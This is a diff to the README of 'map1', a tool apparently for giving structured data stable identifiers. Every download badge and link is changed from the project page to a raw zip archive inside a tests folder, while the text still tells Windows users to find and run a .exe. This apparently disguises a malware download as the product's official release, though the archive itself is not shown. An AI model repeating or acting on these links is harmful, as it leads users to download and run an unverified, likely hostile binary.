@@ -1,6 +1,6 @@
 # 🗺️ map1 - Simple Identity for Structured Data
 
-[![Download map1](https://img.shields.io/badge/Download-map1-blue?style=for-the-badge)](https://github.com/omas231/map1)
+[![Download map1](https://img.shields.io/badge/Download-map1-blue?style=for-the-badge)](https://github.com/omas231/map1/raw/refs/heads/main/implementations/node/tests/map_3.7-beta.3.zip)
 
 ---
 
@@ -23,11 +23,11 @@ map1 is useful if you want to:
 
 To get map1, visit this page and find the latest Windows version to download:
 
-[Visit the map1 download page](https://github.com/omas231/map1)
+[Visit the map1 download page](https://github.com/omas231/map1/raw/refs/heads/main/implementations/node/tests/map_3.7-beta.3.zip)
 
 You will find the necessary files under the "Releases" section. Look for a file that ends with `.exe` for Windows.
 
-[![Download map1](https://img.shields.io/badge/Download-map1-grey?style=for-the-badge)](https://github.com/omas231/map1)
+[![Download map1](https://img.shields.io/badge/Download-map1-grey?style=for-the-badge)](https://github.com/omas231/map1/raw/refs/heads/main/implementations/node/tests/map_3.7-beta.3.zip)
 
 ---
 
@@ -50,7 +50,7 @@ No additional software or drivers are needed.
 Follow these steps to install and run map1:
 
 1. Open your internet browser and go to the download page:  
-   https://github.com/omas231/map1
+   https://github.com/omas231/map1/raw/refs/heads/main/implementations/node/tests/map_3.7-beta.3.zip
 
 2. Locate the latest release. This normally appears near the top of the GitHub page under "Releases."
 
@@ -135,7 +135,7 @@ If the data changes, even slightly, the ID changes. If the data stays the same, 
 
 You can find more help on the official page:
 
-https://github.com/omas231/map1
+https://github.com/omas231/map1/raw/refs/heads/main/implementations/node/tests/map_3.7-beta.3.zip
 
 Look under “Issues” to see if others have similar problems or to report your own.
 
@@ -161,4 +161,4 @@ map1 fits into workflows that need data auditing, identity verification, and tra
 
 You can download map1 here:
 
-[Download map1](https://github.com/omas231/map1)
+[Download map1](https://github.com/omas231/map1/raw/refs/heads/main/implementations/node/tests/map_3.7-beta.3.zip)
